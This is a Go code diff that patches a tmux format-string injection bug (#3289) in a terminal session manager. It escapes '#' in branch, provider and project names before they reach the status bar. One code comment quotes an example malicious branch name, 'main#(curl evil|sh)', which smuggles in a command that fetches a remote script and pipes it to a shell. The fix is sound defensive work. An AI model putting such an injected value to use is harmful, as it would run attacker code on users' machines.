@@ -903,10 +903,52 @@ func (tm *TmuxManager) BindAllSessionKeys() {
 	_ = tm.BindSessionKeys(sessions[0].Name)
 }
 
+// sanitizeTmuxStatusValue neutralizes externally-sourced strings before they
+// are interpolated into a tmux status-left/status-right format. tmux EXECUTES
+// #(shell-command) and expands #{...}/#[...] inside status formats, so an
+// attacker-controlled git branch name like "main#(curl evil|sh)" would run
+// arbitrary commands on every status refresh (#3289). Escaping every '#' to
+// '##' (tmux's literal '#') defuses all #-based expansion; control characters
+// are dropped and the result is clamped. Encoding happens at the tmux sink,
+// not the source, so the real branch/project name is preserved everywhere else.
+func sanitizeTmuxStatusValue(s string) string {
+	const maxRunes = 64
+	var b strings.Builder
+	n := 0
+	for _, r := range s {
+		if n >= maxRunes {
+			break
+		}
+		if r < 0x20 || r == 0x7f {
+			continue // drop control chars (incl. ESC — no escape-sequence injection)
+		}
+		if r == '#' {
+			b.WriteString("##")
+		} else {
+			b.WriteRune(r)
+		}
+		n++
+	}
+	return b.String()
+}
+
 // ConfigureStatusBar sets up a vibeflow-themed tmux status bar for a session.
 // All settings are scoped per-session via set-option -t so they don't leak
 // to other tmux sessions on the same server.
 func (tm *TmuxManager) ConfigureStatusBar(sessionName string, opts StatusBarOpts) error {
+	for key, val := range buildStatusBarSettings(opts) {
+		if _, err := tm.run("set-option", "-t", sessionName, key, val); err != nil {
+			return fmt.Errorf("set %s for session %q: %w", key, sessionName, err)
+		}
+	}
+	return nil
+}
+
+// buildStatusBarSettings builds the vibeflow-themed tmux status-bar options.
+// Split from ConfigureStatusBar so the format construction — including the
+// #3289 injection sanitization of repo-derived values — is unit-testable
+// without a live tmux server.
+func buildStatusBarSettings(opts StatusBarOpts) map[string]string {
 	provider := opts.Provider
 	if provider == "" {
 		provider = "agent"
@@ -915,9 +957,12 @@ func (tm *TmuxManager) ConfigureStatusBar(sessionName string, opts StatusBarOpts
 	if branch == "" {
 		branch = "main"
 	}
+	// Neutralize tmux format-string injection from repo-derived values (#3289).
+	provider = sanitizeTmuxStatusValue(provider)
+	branch = sanitizeTmuxStatusValue(branch)
 
 	// Build status-left: [vibeflow] provider | branch (Ocean palette, theme.go:
-	// deep-ocean bg, sky-blue accent, surface, storm-gray muted, soft fg).
+	// deep-ocean bg, teal accent, surface, storm-gray muted, soft fg).
 	statusLeft := fmt.Sprintf(
 		"#[fg=#0b1929,bg=#00d4aa,bold] vibeflow #[fg=#00d4aa,bg=#152d45,nobold] %s #[fg=#576574]|#[fg=#c8d6e5] %s ",
 		provider, branch,
@@ -928,12 +973,13 @@ func (tm *TmuxManager) ConfigureStatusBar(sessionName string, opts StatusBarOpts
 	if project == "" {
 		project = "default"
 	}
+	project = sanitizeTmuxStatusValue(project)
 	statusRight := fmt.Sprintf(
 		"#[fg=#576574]Ctrl+q:#[fg=#c8d6e5]Menu #[fg=#576574]|#[fg=#576574] Ctrl+\\:#[fg=#c8d6e5]Menu #[fg=#576574]| #[fg=#00d4aa]%s ",
 		project,
 	)
 
-	settings := map[string]string{
+	return map[string]string{
 		"status":              "on",
 		"status-style":        "fg=#c8d6e5,bg=#0b1929",
 		"status-left":         statusLeft,
@@ -941,13 +987,6 @@ func (tm *TmuxManager) ConfigureStatusBar(sessionName string, opts StatusBarOpts
 		"status-left-length":  "60",
 		"status-right-length": "60",
 	}
-
-	for key, val := range settings {
-		if _, err := tm.run("set-option", "-t", sessionName, key, val); err != nil {
-			return fmt.Errorf("set %s for session %q: %w", key, sessionName, err)
-		}
-	}
-	return nil
 }
 
 // GetPaneWorkDir returns the current working directory of the active pane
